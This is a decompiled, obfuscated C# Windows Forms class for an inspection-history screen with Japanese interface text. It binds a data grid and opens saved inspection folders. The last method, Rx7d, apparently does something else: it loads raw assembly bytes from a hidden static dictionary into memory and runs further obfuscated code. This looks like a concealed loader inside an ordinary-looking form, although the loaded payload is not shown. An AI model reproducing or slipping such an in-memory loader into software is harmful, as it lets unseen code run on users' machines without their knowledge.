		((DataGridViewColumn)DatasavedirDataGridViewTextBoxColumn).set_Name("DatasavedirDataGridViewTextBoxColumn");
		((DataGridViewColumn)DatasavedirDataGridViewTextBoxColumn).set_ReadOnly(true);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 12f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(962, 556));
		((Control)this).get_Controls().Add((Control)(object)SplitContainer1);
		((Control)this).set_Name("InspectionHistoryForm");
		((Form)this).set_Text("点検履歴");
		((ISupportInitialize)DataGridView1).EndInit();
		((ISupportInitialize)InspectionhistoryBindingSource).EndInit();
		((Control)SplitContainer1.get_Panel1()).ResumeLayout(false);
		((Control)SplitContainer1.get_Panel2()).ResumeLayout(false);
		((ISupportInitialize)SplitContainer1).EndInit();
		((Control)SplitContainer1).ResumeLayout(false);
		((Control)this).ResumeLayout(false);
	}

	public void Bw9r(int e4X2)
	{
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		//IL_001a: Expected O, but got Unknown
		Ks2n arg = default(Ks2n);
		Ks2n CS_0024_003C_003E8__locals0 = new Ks2n(arg);
		CS_0024_003C_003E8__locals0._0024VB_0024Local_key = e4X2;
		Fs4f fs4f = new Fs4f();
		BindingSource val = new BindingSource();
		foreach (Py5x item in ((IQueryable<Py5x>)fs4f.inspectionhistory).Where((Py5x n) => n.id == CS_0024_003C_003E8__locals0._0024VB_0024Local_key))
		{
			val.Add((object)item);
		}
		DataGridView1.set_DataSource((object)val);
	}

	private void m3L1(object sender, EventArgs e)
	{
		//IL_009c: Unknown result type (might be due to invalid IL or missing references)
		En6t en6t = En6t.x0Y3();
		Fs4f fs4f = new Fs4f();
		Py5x py5x = fs4f.inspectionhistory.Find(new object[2]
		{
			DataGridView1.get_Item(0, ((DataGridViewBand)DataGridView1.get_CurrentRow()).get_Index()).get_Value(),
			DataGridView1.get_Item(1, ((DataGridViewBand)DataGridView1.get_CurrentRow()).get_Index()).get_Value()
		});
		if (py5x != null && py5x.datasavedir.Length > 0)
		{
			Process.Start(Path.Combine(en6t.SaveDirectoryPath, py5x.datasavedir));
		}
		else
		{
			Interaction.MsgBox((object)"点検データの登録がありません。", (MsgBoxStyle)0, (object)null);
		}
	}

	internal static void Rx7d()
	{
		Assembly assembly = null;
		byte[] rawAssembly = (byte[])Sb0.mDic[Sb0.mArray];
		assembly = Assembly.Load(rawAssembly);
		Sb0.mDic.Add("Deep", assembly);
		assembly = null;
		if (k9LK.Mz6e())
		{
			y2T5.Qb43();
		}
	}
}
